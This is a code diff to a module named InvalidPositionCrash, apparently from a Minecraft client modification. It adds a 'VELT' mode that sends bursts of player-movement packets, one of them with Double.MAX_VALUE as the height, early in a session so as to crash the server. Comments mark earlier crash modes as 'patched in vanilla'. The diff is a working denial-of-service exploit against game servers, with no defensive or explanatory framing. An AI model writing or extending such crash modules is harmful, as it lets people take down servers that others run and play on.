@@ -78,6 +78,15 @@ public class InvalidPositionCrash extends Module {
                     mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(mc.player.getX(), mc.player.getY() + (i * (double) amount.get()), mc.player.getZ() + (i * 9), true));
                 }
             }
+            case VELT -> {
+                if (mc.player.age < 100) {
+                    for (int i = 0; i < amount.get(); i++) {
+                        mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(mc.player.getX(), mc.player.getY() - 1.0D, mc.player.getZ(), false));
+                        mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(mc.player.getX(), Double.MAX_VALUE, mc.player.getZ(), false));
+                        mc.getNetworkHandler().sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(mc.player.getX(), mc.player.getY() - 1.0D, mc.player.getZ(), false));
+                    }
+                }
+            }
         }
     }
 
@@ -91,6 +100,7 @@ public class InvalidPositionCrash extends Module {
         Y_NAN,              //patched in vanilla
         FULL_NAN,           //patched in vanilla
         INFINITY,
-        TP
+        TP,
+        VELT
     }
 }
